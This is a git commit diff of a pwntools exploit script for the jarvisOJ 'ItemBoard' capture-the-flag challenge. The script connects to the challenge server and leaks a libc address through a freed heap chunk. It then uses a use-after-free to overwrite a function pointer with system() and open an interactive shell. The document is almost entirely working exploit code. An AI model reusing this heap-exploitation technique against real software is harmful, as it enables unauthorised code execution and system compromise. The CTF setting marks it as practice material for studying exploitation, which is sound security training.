6c457d6300d6ae07f8f16f9a0d20c305a3964f32
bash-c <aboultraman@gmail.com>
2018-09-18 20:04:34 +0800

    leak and uaf

--- jarvisOJ_ItemBoard/exp.py
+++ jarvisOJ_ItemBoard/exp.py
@@ -1,29 +1,50 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
 
 from pwn import *
 from time import sleep
+import roputils as rp
+import os
 import sys
-context.log_level = "debug"
-context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
+elfPath = "./itemboard"
+libcPath = "./libc-2.19.so"
+remoteAddr = "pwn2.jarvisoj.com"
+remotePort = 9887
+
+context.binary = elfPath
+elf = context.binary
 if sys.argv[1] == "l":
-    io = process("./itemboard")
-    elf = ELF("./itemboard")
+    io = process(elfPath)
     libc = elf.libc
-    main_arena = 0x399b00
+    main_arena = 0x3b4c40
 
 else:
-    io = remote("pwn2.jarvisoj.com", 9887)
-    elf = ELF("./itemboard")
-    libc = ELF("./libc-2.19.so")
+    if sys.argv[1] == "d":
+        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
+    else:
+        io = remote(remoteAddr, remotePort)
+    if libcPath:
+        libc = ELF(libcPath)
     main_arena = 0x3be760
+    one_gadget = 0x4647c
 
+context.log_level = "debug"
+context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
+success = lambda name, value: log.success("{} -> {:#x}".format(name, value))
 
-def DEBUG():
-	raw_input("DEBUG: ")
-	gdb.attach(io)
+def DEBUG(bps = [], pie = False):
+    cmd = "set follow-fork-mode parent\n"
+    if pie:
+        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
+        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
+    else:
+        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])
+
+    if bps != []:
+        cmd += "c"
+
+    gdb.attach(io, cmd)
 
 def add(name, length, des):
     io.sendlineafter(":\n", "1")
@@ -39,25 +60,23 @@ def remove(idx):
     io.sendlineafter(":\n", "4")
     io.sendlineafter("?\n", str(idx))
 
+
 if __name__ == "__main__":
-    #  add('a' * 30, 0x80, 'a' * 8)
-    add('aaaa', 0x80, 'aaaa')
-    add('bbbb', 0x80, 'bbbb')
+    add('0000', 0x90, '0000')
+    add('1111', 0x20, '1111')
     remove(0)
-    #  DEBUG()
     show(0)
+    libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - 88 - main_arena
+    success("libc", libc.address)
 
-    libcBase = u64(io.recvuntil("\x7f")[-6: ].ljust(8, "\x00")) - 88 - main_arena
-    success("libcBase -> {:#x}".format(libcBase))
-    pause()
-
-    remove(1)
-    add('cccc', 32, 'cccc')
-    add('dddd', 32, 'dddd')
+    add('2222', 32, '2222')
+    add('3333', 32, '3333')
     remove(2)
     remove(3)
-    add('eeee', 24, "$0;" + "eeeeeeeeeeeee" + p64(libcBase + libc.sym["system"]))
+    #  DEBUG([0xEF6, 0xE1B, 0xE37], True)
+    add('4444', 24, '$0;'.ljust(16, '0') + p64(libc.sym['system']))
     remove(2)
-
+    
     io.interactive()
-    io.close()
+
+
